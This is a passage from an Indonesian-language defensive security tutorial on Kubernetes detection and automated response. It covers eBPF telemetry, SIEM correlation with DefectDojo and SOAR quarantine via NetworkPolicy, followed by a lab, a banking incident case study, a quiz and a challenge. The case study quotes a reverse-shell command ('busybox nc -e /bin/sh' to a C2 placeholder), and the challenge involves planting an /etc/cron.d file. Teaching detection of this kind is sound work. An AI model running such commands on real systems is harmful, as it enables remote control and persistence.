kind: NetworkPolicy
metadata:
  name: allow-internal
  namespace: sec-ops-lab
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - {}
  egress:
  - {}
EOF
```

#### Langkah 2: Deploy Aplikasi Target Rentan
```bash
# Menjalankan pod aplikasi target simulasi
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-web-pod
  namespace: sec-ops-lab
  labels:
    app: vulnerable-web
spec:
  containers:
  - name: web
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      allowPrivilegeEscalation: false
EOF
```

#### Langkah 3: Menjalankan SOAR Remediation Controller Lokal
Jalankan skrip controller SOAR yang telah ditulis pada Bagian 10 di lingkungan eksekusi host atau sebagai pod kontrol:
```bash
# Ekspor kredensial environment
export SOAR_WEBHOOK_SECRET="SuperSecureHMACSecretKey987654321"

# Jalankan server SOAR pada background
python3 soar_controller.py &
SOAR_PID=$!
echo "SOAR Server aktif pada PID: $SOAR_PID"
```

#### Langkah 4: Simulasi Serangan (Pemicu Anomali eBPF/Audit)
Jalankan proses shell interaktif ilegal di dalam pod aplikasi yang sedang berjalan untuk mensimulasikan eksploitasi Remote Code Execution:
```bash
kubectl exec -it vulnerable-web-pod -n sec-ops-lab -- /bin/sh -c "whoami; id"
```

#### Langkah 5: Mengirimkan Sinyal Peringatan SIEM Tersimulasi ke SOAR
Kirimkan webhook payload yang merefleksikan event deteksi Wazuh/eBPF ke endpoint SOAR, ditandatangani secara kriptografis menggunakan kunci HMAC:
```bash
# Buat Payload JSON
PAYLOAD='{"rule":{"level":14,"mitre":{"id":["T1059.004"]}},"kubernetes":{"namespace":"sec-ops-lab","pod_name":"vulnerable-web-pod"}}'

# Hitung Signature HMAC SHA256
SIG=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "SuperSecureHMACSecretKey987654321" | sed 's/^.* //')

# Kirim Request HTTP POST ke Webhook SOAR
curl -X POST http://127.0.0.1:8443/ \
     -H "Content-Type: application/json" \
     -H "X-Signature-SHA256: sha256=$SIG" \
     -d "$PAYLOAD"
```

#### Langkah 6: Validasi Efektivitas Isolasi
Periksa status pod dan keberadaan NetworkPolicy isolasi yang dipasang oleh automasi:
```bash
# Periksa apakah label quarantine telah terpasang pada pod
kubectl get pod vulnerable-web-pod -n sec-ops-lab --show-labels

# Periksa NetworkPolicy isolasi yang dibuat oleh SOAR
kubectl get networkpolicy quarantine-vulnerable-web-pod -n sec-ops-lab -o yaml

# Uji eksekusi konektivitas egress dari dalam pod (harus timeout/gagal)
kubectl exec -it vulnerable-web-pod -n sec-ops-lab -- nc -zw 2 8.8.8.8 53 || echo "ISOLASI BERHASIL: Trafik terputus mutlak!"

# Pembersihan Lab
kill -9 $SOAR_PID
kubectl delete namespace sec-ops-lab
```

---

### 17. Real-world Case Study & Incident Analysis Enterprise

#### Latar Belakang Insiden:
Sebuah entitas perbankan multinasional mengalami anomali pada lingkungan produksi Kubernetes mereka. Penyerang berhasil membobol sebuah *ingress-controller* yang belum ditambal melalui eksploitasi *heap overflow* pada modul parser HTTP, lalu memperoleh akses eksekusi kode acak.

#### Tahapan Analisis Forensik dan Kegagalan Sistem Konvensional:
1. **Kegagalan Audit Userspace:** Penyerang langsung menghapus file log aplikasi di `/var/log/nginx/` dan menonaktifkan pengiriman log lokal ke host. Tim operasi tidak melihat adanya anomali pada *dashboard* metrik sistem biasa karena utilisasi CPU dan RAM tetap berada di bawah ambang 15%.
2. **Deteksi via eBPF Telemetry:** Daemon telemetri eBPF (Tetragon) yang berjalan di tingkat kernel secara independen mendeteksi pemanggilan *syscall* tak wajar: proses *worker* Nginx memicu `sys_enter_execve` dengan argumen `/bin/busybox nc -e /bin/sh <C2_IP> 4444`. Data ini tidak dapat disembunyikan oleh penyerang karena eksekusi dicatat langsung dari jalur instruksi kernel *sched_process_exec*.
3. **Korelasi SIEM & DefectDojo:** Sinyal diteruskan ke Elasticsearch dan Wazuh. Aturan SIEM mengidentifikasi taktik MITRE ATT&CK T1059 (Command and Scripting Interpreter). SIEM secara otomatis menanyakan status aset ke DefectDojo, mengonfirmasi bahwa *ingress-controller* tersebut memiliki kerentanan kritis CVE aktif yang belum sempat di-patch oleh tim rilis.
4. **Respon SOAR Terotomatisasi:** Playbook SOAR dieksekusi seketika dalam tempo 1,8 detik:
   * Mengirimkan instruksi ke *Cloud Edge Firewall* untuk memblokir IP Command & Control (C2).
   * Menerapkan label isolasi pada pod kompromi dan memicu *NetworkPolicy deny-all*.
   * Mengambil *snapshot memory* dari node host bersangkutan untuk preservasi artefak forensik perbankan.
   * Menjadwalkan pod pengganti menggunakan image yang telah diperbaiki.
5. **Dampak Bisnis:** Intervensi deterministik berbasis SOAR memotong potensi kebocoran data sensitif pemegang kartu. Mean Time to Containment (MTTC) tercatat 2,1 detik dari eksekusi reverse shell awal, mencegah aksi eskalasi horizontal (*lateral movement*) lebih lanjut.

---

### 18. Quiz Pemahaman & Challenge

#### Soal Pilihan Ganda

**Q1:** Mengapa telemetri keamanan berbasis eBPF dianggap jauh lebih andal dibandingkan dengan audit berbasis log aplikasi atau syslog file di dalam kontainer?
* A) Karena eBPF mengompresi log menggunakan enkripsi kuantum sebelum menyimpannya ke disk.
* B) Karena program eBPF berjalan di ruang kernel Linux dan menyadap tracepoints/syscalls secara independen, sehingga kebal terhadap manipulasi atau penghapusan log oleh akun root di ruang pengguna (userspace).
* C) Karena eBPF tidak membutuhkan memori RAM sama sekali dalam operasinya.
* D) Karena eBPF secara otomatis mematikan server jika terjadi pemanggilan proses yang tidak dikenal.

**Q2:** Dalam skenario integrasi SIEM dan Centralized Vulnerability Management (DefectDojo), apa fungsi utama verifikasi konteks kerentanan sebelum memicu respons SOAR yang agresif?
* A) Menghapus database log untuk menghemat ruang disk elasticsearch.
* B) Memberikan jeda waktu bagi penyerang untuk menyelesaikan operasinya.
* C) Mengurangi dampak false-positive dan *alert fatigue* dengan memastikan bahwa peringatan eksploitasi berkorelasi dengan profil kerentanan aktif yang nyata pada aset terkait sebelum mengambil tindakan perbaikan berat.
* D) Mengubah kode sumber aplikasi secara real-time di repositori Git.

**Q3:** Sebuah pod Kubernetes telah terkompromi dan mengeksekusi reverse shell. Manakah konfigurasi deklaratif berikut yang paling efektif diterapkan oleh SOAR untuk memblokir seluruh lalu lintas komunikasi keluar dan masuk pod tersebut secara instan tanpa langsung menghapus pod untuk kebutuhan forensik?
* A) Menghapus ServiceAccount yang terikat pada pod.
* B) Menerapkan NetworkPolicy terisolasi dengan selektor label pod yang ditargetkan tanpa mendeklarasikan blok `ingress` maupun `egress` (deny-all implicitly).
* C) Mengubah alokasi CPU limit pod menjadi 0 pada runtime cgroups.
* D) Mengirimkan sinyal HTTP GET ke port aplikasi.

---

#### Challenge Praktik Mandiri
**Deskripsi Tantangan:**
Tulis sebuah skrip Chaos Security Engineering menggunakan Python (`chaos_detector_test.py`) yang secara sengaja melakukan validasi terhadap pipeline SIEM dan SOAR Anda:
1. Skrip harus mengeksekusi pembuatan berkas bayangan terlarang di direktori `/etc/cron.d/evil_job` di dalam container uji.
2. Skrip secara asinkron memantau log audit lokal atau endpoint SIEM untuk memastikan bahwa peringatan bersangkutan (MITRE T1053 - Scheduled Task/Job) terbit dalam durasi `< 3 detik`.
3. Skrip harus memvalidasi bahwa pod uji tersebut telah sukses diisolasi oleh SOAR (verifikasi label `security.isolation=quarantined` terpasang).
4. Skrip harus membersihkan seluruh jejak pengujian secara aman dan menampilkan metrik performa pipeline deteksi (MTTD & MTTR terukur).

---

### 19. Summary & Key Takeaways
* **Observabilitas Berbasis Kernel adalah Fondasi:** Keamanan kontainer tidak dapat bergantung pada log ruang pengguna. eBPF menyediakan visibilitas tingkat instruksi kernel yang tahan terhadap manipulasi penyerang dengan hak akses *root*.
* **Kontekstualisasi Mengalahkan Alert Fatigue:** Mengintegrasikan platform Centralized Vulnerability Management (DefectDojo) dengan SIEM mengubah data telemetri mentah menjadi intelijen ancaman yang dapat ditindaklanjuti secara presisi.
* **Respon Otomatis Deterministik:** Pipeline SOAR memangkas MTTR dari hitungan jam menjadi detik, menutup celah eksploitasi horizontal penyerang sebelum eskalasi hak istimewa menyebar ke seluruh kluster.
* **Chaos Security sebagai Validasi Kontinu:** Mekanisme pertahanan harus diuji secara proaktif dan berkala. Chaos Security Engineering memastikan bahwa instrumentasi deteksi, aturan korelasi SIEM, dan playbook otomasi SOAR tetap berfungsi secara deterministik melawan degradasi sistem.

---

### 20. Referensi Resmi & Standar Keamanan

1. **NIST SP 800-61 Rev. 2:** *Computer Security Incident Handling Guide* – Rekomendasi standar penanganan insiden, tahap penahanan (*containment*), dan orkestrasi respons.
2. **NIST SP 800-137:** *Information Security Continuous Monitoring (ISCM) for Federal Information Systems and Organizations* – Kerangka kerja observabilitas dan pemantauan keamanan kontinu.
3. **MITRE ATT&CK Framework for Containers & Linux:**
   * T1059.004: *Command and Scripting Interpreter: Unix Shell*
   * T1053: *Scheduled Task/Job*
   * T1055: *Process Injection*
4. **OWASP DevSecOps Guideline:** *Vulnerability Management & Logging Maturity Criteria*.
5. **Center for Internet Security (CIS) Benchmarks:**
   * *CIS Kubernetes Benchmark v1.8.0 (Section 3: Logging and Auditing)*
   * *CIS Distribution Independent Linux Benchmark (Section 4: Logging and Auditing)*
6. **Kernel.org Documentation:** *Extended Berkeley Packet Filter (eBPF) Architecture and Verifier Subsystem Guidelines*.